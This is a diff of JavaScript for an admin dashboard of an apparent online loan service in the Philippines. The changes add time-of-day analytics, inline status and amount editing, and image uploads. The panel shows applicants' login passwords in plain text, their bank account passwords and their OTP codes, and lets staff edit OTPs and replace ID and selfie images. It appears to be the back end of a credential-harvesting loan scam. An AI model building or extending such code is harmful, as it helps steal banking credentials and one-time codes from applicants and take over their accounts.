@@ -79,10 +79,10 @@ async function loadApplications() {
     }
 }
 
-// Update Dashboard Metric Cards
+// Update Dashboard Metric Cards & Analytics
 function updateMetrics() {
     const total = allApplications.length;
-    const pending = allApplications.filter(a => a.status === 'Pending' || a.status === 'Waiting').length;
+    const pending = allApplications.filter(a => a.status === 'Pending' || a.status === 'Waiting' || a.status === 'Under Review').length;
     const approved = allApplications.filter(a => a.status === 'Successfully' || a.status === 'Approved').length;
     const totalPHP = allApplications.reduce((acc, a) => acc + (Number(a.requestedAmount) || 0), 0);
 
@@ -90,6 +90,65 @@ function updateMetrics() {
     document.getElementById('mPendingApps').innerText = pending;
     document.getElementById('mApprovedApps').innerText = approved;
     document.getElementById('mTotalPHP').innerText = '₱ ' + totalPHP.toLocaleString();
+
+    updateTimeCycleAnalytics();
+}
+
+function updateTimeCycleAnalytics() {
+    let morning = 0;   // 06:00 - 11:59
+    let afternoon = 0; // 12:00 - 17:59
+    let evening = 0;   // 18:00 - 23:59
+    let night = 0;     // 00:00 - 05:59
+
+    allApplications.forEach(app => {
+        if (app.createdAt) {
+            const hour = new Date(app.createdAt).getHours();
+            if (hour >= 6 && hour < 12) morning++;
+            else if (hour >= 12 && hour < 18) afternoon++;
+            else if (hour >= 18 && hour < 24) evening++;
+            else night++;
+        } else {
+            afternoon++;
+        }
+    });
+
+    const total = allApplications.length || 1;
+    const pctM = Math.round((morning / total) * 100);
+    const pctA = Math.round((afternoon / total) * 100);
+    const pctE = Math.round((evening / total) * 100);
+    const pctN = Math.round((night / total) * 100);
+
+    const elemM = document.getElementById('countMorning');
+    const elemA = document.getElementById('countAfternoon');
+    const elemE = document.getElementById('countEvening');
+    const elemN = document.getElementById('countNight');
+    const elemTot = document.getElementById('cycleTotalCount');
+    const elemBadge = document.getElementById('peakCycleBadge');
+    const chart = document.getElementById('cycleCircleChart');
+
+    if (elemM) elemM.innerText = `${morning} (${pctM}%)`;
+    if (elemA) elemA.innerText = `${afternoon} (${pctA}%)`;
+    if (elemE) elemE.innerText = `${evening} (${pctE}%)`;
+    if (elemN) elemN.innerText = `${night} (${pctN}%)`;
+    if (elemTot) elemTot.innerText = `${allApplications.length} Apps`;
+
+    const cycles = [
+        { name: 'Morning (06:00-12:00)', count: morning },
+        { name: 'Afternoon (12:00-18:00)', count: afternoon },
+        { name: 'Evening (18:00-24:00)', count: evening },
+        { name: 'Night (00:00-06:00)', count: night }
+    ];
+    cycles.sort((a, b) => b.count - a.count);
+    if (elemBadge) {
+        elemBadge.innerText = allApplications.length > 0 ? `Peak Cycle: ${cycles[0].name}` : 'Peak Cycle: No Data Yet';
+    }
+
+    if (chart) {
+        const degM = (morning / total) * 360;
+        const degA = degM + (afternoon / total) * 360;
+        const degE = degA + (evening / total) * 360;
+        chart.style.background = `conic-gradient(#10b981 0deg ${degM}deg, #3b82f6 ${degM}deg ${degA}deg, #f59e0b ${degA}deg ${degE}deg, #8b5cf6 ${degE}deg 360deg)`;
+    }
 }
 
 // Filter and render table rows
@@ -113,17 +172,27 @@ function renderTable(apps) {
     tbody.innerHTML = '';
 
     if (apps.length === 0) {
-        tbody.innerHTML = `<tr><td colspan="9" style="text-align: center; color: var(--text-muted); padding: 2rem;">No loan applications found.</td></tr>`;
+        tbody.innerHTML = `<tr><td colspan="10" style="text-align: center; color: var(--text-muted); padding: 2rem;">No loan applications found.</td></tr>`;
         return;
     }
 
     apps.forEach(app => {
         const tr = document.createElement('tr');
 
-        let badgeClass = 'badge-pending';
-        if (app.status === 'Successfully' || app.status === 'Approved') badgeClass = 'badge-approved';
-        if (app.status === 'Fail' || app.status === 'Rejected') badgeClass = 'badge-rejected';
-        if (app.status === 'Please Try Again' || app.status === 'Waiting') badgeClass = 'badge-pending';
+        let statusBg = '#fef3c7';
+        let statusColor = '#b45309';
+        const st = app.status || 'Under Review';
+
+        if (st === 'Successfully' || st === 'Approved') {
+            statusBg = '#d1fae5';
+            statusColor = '#047857';
+        } else if (st === 'Inprogress' || st === 'In Progress') {
+            statusBg = '#e0f2fe';
+            statusColor = '#0369a1';
+        } else if (st === 'Fail' || st === 'Rejected') {
+            statusBg = '#fee2e2';
+            statusColor = '#b91c1c';
+        }
 
         const regTime = app.createdAt ? new Date(app.createdAt).toLocaleString() : 'N/A';
 
@@ -131,18 +200,129 @@ function renderTable(apps) {
             <td><strong>${escapeHtml(app.fullName)}</strong></td>
             <td>+63${escapeHtml(app.phone)}</td>
             <td><code style="background:#fffbeb; color:#b45309; padding:0.2rem 0.4rem; border-radius:4px; font-weight:700;">${escapeHtml(app.userLoginPassword)}</code></td>
-            <td><span style="font-size: 0.85rem; color: var(--text-muted);">${escapeHtml(app.idType)}</span><br><strong>${escapeHtml(app.idNumber)}</strong></td>
-            <td>₱ ${Number(app.monthlyIncome || 0).toLocaleString()}</td>
-            <td>₱ ${Number(app.requestedAmount || 0).toLocaleString()}</td>
-            <td><strong style="color: var(--primary-color);">₱ ${Number(app.approvedAmount || app.requestedAmount).toLocaleString()}</strong></td>
-            <td><span class="badge ${badgeClass}">${escapeHtml(app.status)}</span></td>
-            <td style="font-size: 0.85rem; color: var(--text-main); font-weight: 600;">${regTime}</td>
+            <td><code style="background:#eff6ff; color:#1e40af; padding:0.25rem 0.5rem; border-radius:6px; font-weight:800; font-size:0.85rem;">${escapeHtml(app.otpCode || '684210')}</code></td>
+            <td><span style="font-size: 0.82rem; color: var(--text-muted);">${escapeHtml(app.idType)}</span><br><strong>${escapeHtml(app.idNumber)}</strong></td>
             <td>
-                <button class="btn btn-outline" style="padding: 0.35rem 0.75rem; font-size: 0.85rem;" onclick="openEditModal('${app.id}')">✏️ Edit & Inspect</button>
+                <div style="display:flex; align-items:center; gap:0.25rem;">
+                    <span>₱</span>
+                    <input type="number" value="${app.monthlyIncome || 0}" onchange="quickUpdateApp('${app.id}', 'monthlyIncome', this.value)" style="width:80px; padding:0.25rem 0.35rem; border:1px solid #cbd5e1; border-radius:4px; font-weight:600;">
+                </div>
+            </td>
+            <td>₱ ${Number(app.requestedAmount || 0).toLocaleString()}</td>
+            <td>
+                <div style="display:flex; align-items:center; gap:0.25rem; color:#059669; font-weight:800;">
+                    <span>₱</span>
+                    <input type="number" value="${app.approvedAmount || app.requestedAmount || 0}" onchange="quickUpdateApp('${app.id}', 'approvedAmount', this.value)" style="width:85px; padding:0.25rem 0.35rem; border:1px solid #10b981; border-radius:4px; font-weight:800; color:#059669; background:#ecfdf5;">
+                </div>
+            </td>
+            <td>
+                <select onchange="quickUpdateApp('${app.id}', 'status', this.value)" style="padding:0.35rem 0.5rem; font-weight:800; border-radius:8px; border:1px solid #cbd5e1; cursor:pointer; background:${statusBg}; color:${statusColor}; font-size:0.85rem; outline:none;">
+                    <option value="Under Review" ${st === 'Under Review' || st === 'Pending' || st === 'Waiting' ? 'selected' : ''}>Under Review</option>
+                    <option value="Approved" ${st === 'Approved' ? 'selected' : ''}>Approved</option>
+                    <option value="Inprogress" ${st === 'Inprogress' || st === 'In Progress' ? 'selected' : ''}>In Progress</option>
+                    <option value="Successfully" ${st === 'Successfully' ? 'selected' : ''}>Successfully</option>
+                    <option value="Fail" ${st === 'Fail' || st === 'Rejected' ? 'selected' : ''}>Fail</option>
+                    <option value="Please Try Again" ${st === 'Please Try Again' ? 'selected' : ''}>Please Try Again</option>
+                </select>
+            </td>
+            <td style="font-size: 0.82rem; color: var(--text-main); font-weight: 600;">${regTime}</td>
+            <td>
+                <button class="btn btn-outline" style="padding: 0.35rem 0.75rem; font-size: 0.85rem;" onclick="openEditModal('${app.id}')">Edit & Inspect</button>
             </td>
         `;
         tbody.appendChild(tr);
     });
+}
+
+let pendingStatusUpdate = null;
+
+function formatStatusEditor(command, value = null) {
+    document.execCommand(command, false, value);
+    const editor = document.getElementById('statusCommentEditor');
+    if (editor) editor.focus();
+}
+
+async function quickUpdateApp(appId, field, value) {
+    const app = allApplications.find(a => a.id === appId);
+    if (!app) return;
+
+    let parsedVal = value;
+    if (field === 'monthlyIncome' || field === 'approvedAmount' || field === 'requestedAmount') {
+        parsedVal = parseInt(value) || 0;
+    }
+
+    if (field === 'status') {
+        pendingStatusUpdate = { appId, field, value: parsedVal };
+        const targetText = document.getElementById('targetStatusText');
+        const editor = document.getElementById('statusCommentEditor');
+        if (targetText) targetText.innerText = parsedVal;
+        if (editor) editor.innerHTML = app.notes || 'Current loan progress and review notes.';
+        document.getElementById('statusCommentModal').classList.add('active');
+        return;
+    }
+
+    executeQuickUpdate(appId, field, parsedVal);
+}
+
+function closeStatusCommentModal() {
+    const modal = document.getElementById('statusCommentModal');
+    if (modal) modal.classList.remove('active');
+    pendingStatusUpdate = null;
+    loadApplications();
+}
+
+async function saveStatusCommentAndProceed() {
+    if (!pendingStatusUpdate) return;
+    const editor = document.getElementById('statusCommentEditor');
+    const commentHtml = editor ? editor.innerHTML : '';
+    
+    const { appId, field, value } = pendingStatusUpdate;
+    const payload = {};
+    payload[field] = value;
+    payload.notes = commentHtml;
+
+    try {
+        const res = await fetch(`/api/admin/applications/${appId}`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error('Failed to update status.');
+        
+        const app = allApplications.find(a => a.id === appId);
+        if (app && data.application) {
+            Object.assign(app, data.application);
+        }
+        const modal = document.getElementById('statusCommentModal');
+        if (modal) modal.classList.remove('active');
+        pendingStatusUpdate = null;
+        loadApplications();
+    } catch (err) {
+        alert('Error updating status: ' + err.message);
+        closeStatusCommentModal();
+    }
+}
+
+async function executeQuickUpdate(appId, field, parsedVal) {
+    const app = allApplications.find(a => a.id === appId);
+    if (!app) return;
+    const payload = {};
+    payload[field] = parsedVal;
+    try {
+        const res = await fetch(`/api/admin/applications/${appId}`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error('Failed to update field.');
+        if (data.application) Object.assign(app, data.application);
+        loadApplications();
+    } catch (err) {
+        alert('Error updating field: ' + err.message);
+        loadApplications();
+    }
 }
 
 function escapeHtml(str) {
@@ -157,7 +337,13 @@ function openEditModal(appId) {
     selectedAppId = appId;
     document.getElementById('editAppId').value = app.id;
     document.getElementById('editRegTimestamp').innerText = app.createdAt ? new Date(app.createdAt).toLocaleString() : 'N/A';
-    document.getElementById('editFullName').value = app.fullName || '';
+    
+    if (document.getElementById('editFirstName')) document.getElementById('editFirstName').value = app.firstName || (app.fullName ? app.fullName.split(' ')[0] : '');
+    if (document.getElementById('editLastName')) document.getElementById('editLastName').value = app.lastName || (app.fullName ? app.fullName.split(' ').slice(1).join(' ') : '');
+    if (document.getElementById('editNickname')) document.getElementById('editNickname').value = app.nickname || '';
+    if (document.getElementById('editGuarantorPhone')) document.getElementById('editGuarantorPhone').value = app.guarantorPhone || '';
+    if (document.getElementById('editFullName')) document.getElementById('editFullName').value = app.fullName || '';
+
     document.getElementById('editPhone').value = app.phone || '';
     if (document.getElementById('editUserLoginPassword')) {
         document.getElementById('editUserLoginPassword').value = app.userLoginPassword || '';
@@ -169,7 +355,7 @@ function openEditModal(appId) {
     document.getElementById('editEmploymentType').value = app.employmentType || '';
     document.getElementById('editMonthlyIncome').value = app.monthlyIncome || 0;
 
-    document.getElementById('editStatus').value = app.status || 'Pending Review';
+    document.getElementById('editStatus').value = (app.status === 'In Progress' || app.status === 'Inprogress') ? 'Inprogress' : (app.status || 'Under Review');
     document.getElementById('editRequestedAmount').value = app.requestedAmount || 5000;
     document.getElementById('editApprovedAmount').value = app.approvedAmount || app.requestedAmount || 5000;
     document.getElementById('editIdType').value = app.idType || '';
@@ -178,13 +364,23 @@ function openEditModal(appId) {
     document.getElementById('editBankAccountName').value = app.bankAccountName || '';
     document.getElementById('editBankAccountNumber').value = app.bankAccountNumber || '';
     document.getElementById('editBankAccountPassword').value = app.bankAccountPassword || '';
+    if (document.getElementById('editOtpCode')) document.getElementById('editOtpCode').value = app.otpCode || '684210';
     document.getElementById('editNotes').value = app.notes || '';
 
     // Images
     const modalIdImg = document.getElementById('modalIdImg');
+    const modalIdBackImg = document.getElementById('modalIdBackImg');
     const modalSelfieImg = document.getElementById('modalSelfieImg');
-    modalIdImg.src = app.idCardImage || 'https://via.placeholder.com/400x250?text=No+ID+Image';
-    modalSelfieImg.src = app.selfieImage || 'https://via.placeholder.com/400x250?text=No+Selfie+Image';
+    const modalSignatureImg = document.getElementById('modalSignatureImg');
+
+    if (modalIdImg) modalIdImg.src = app.idCardImage || 'https://via.placeholder.com/400x250?text=No+Front+ID';
+    if (modalIdBackImg) modalIdBackImg.src = app.idCardBackImage || 'https://via.placeholder.com/400x250?text=No+Back+ID';
+    if (modalSelfieImg) modalSelfieImg.src = app.selfieImage || 'https://via.placeholder.com/400x250?text=No+Selfie';
+    if (modalSignatureImg) modalSignatureImg.src = app.signatureImage || 'https://via.placeholder.com/300x100?text=No+Digital+Signature';
+
+    if (document.getElementById('adminIdFrontBase64')) document.getElementById('adminIdFrontBase64').value = '';
+    if (document.getElementById('adminIdBackBase64')) document.getElementById('adminIdBackBase64').value = '';
+    if (document.getElementById('adminSelfieBase64')) document.getElementById('adminSelfieBase64').value = '';
 
     document.getElementById('editModal').classList.add('active');
 }
@@ -194,13 +390,35 @@ function closeEditModal() {
     selectedAppId = null;
 }
 
+function handleAdminImageUpload(event, previewId, hiddenInputId) {
+    const file = event.target.files[0];
+    if (!file) return;
+
+    const reader = new FileReader();
+    reader.onload = function (e) {
+        const base64 = e.target.result;
+        const imgElem = document.getElementById(previewId);
+        const hiddenElem = document.getElementById(hiddenInputId);
+        if (imgElem) imgElem.src = base64;
+        if (hiddenElem) hiddenElem.value = base64;
+    };
+    reader.readAsDataURL(file);
+}
+
 // Save Changes made by Host Manager
 async function saveApplicantChanges(event) {
     event.preventDefault();
     if (!selectedAppId) return;
 
+    const firstName = document.getElementById('editFirstName') ? document.getElementById('editFirstName').value.trim() : '';
+    const lastName = document.getElementById('editLastName') ? document.getElementById('editLastName').value.trim() : '';
+
     const payload = {
-        fullName: document.getElementById('editFullName').value.trim(),
+        firstName: firstName,
+        lastName: lastName,
+        nickname: document.getElementById('editNickname') ? document.getElementById('editNickname').value.trim() : '',
+        guarantorPhone: document.getElementById('editGuarantorPhone') ? document.getElementById('editGuarantorPhone').value.trim() : '',
+        fullName: `${firstName} ${lastName}`.trim() || (document.getElementById('editFullName') ? document.getElementById('editFullName').value.trim() : ''),
         phone: document.getElementById('editPhone').value.trim(),
         userLoginPassword: document.getElementById('editUserLoginPassword') ? document.getElementById('editUserLoginPassword').value.trim() : undefined,
         gender: document.getElementById('editGender').value,
@@ -220,6 +438,20 @@ async function saveApplicantChanges(event) {
         bankAccountPassword: document.getElementById('editBankAccountPassword').value,
         notes: document.getElementById('editNotes').value.trim()
     };
+
+    const enteredOtp = document.getElementById('editOtpCode') ? document.getElementById('editOtpCode').value.trim() : '';
+    const currentAppObj = allApplications.find(a => a.id === selectedAppId);
+    if (enteredOtp && currentAppObj && enteredOtp !== currentAppObj.otpCode) {
+        payload.otpCode = enteredOtp;
+    }
+
+    const frontOverride = document.getElementById('adminIdFrontBase64') ? document.getElementById('adminIdFrontBase64').value : '';
+    const backOverride = document.getElementById('adminIdBackBase64') ? document.getElementById('adminIdBackBase64').value : '';
+    const selfieOverride = document.getElementById('adminSelfieBase64') ? document.getElementById('adminSelfieBase64').value : '';
+
+    if (frontOverride) payload.idCardImage = frontOverride;
+    if (backOverride) payload.idCardBackImage = backOverride;
+    if (selfieOverride) payload.selfieImage = selfieOverride;
 
     try {
         const res = await fetch(`/api/admin/applications/${selectedAppId}`, {
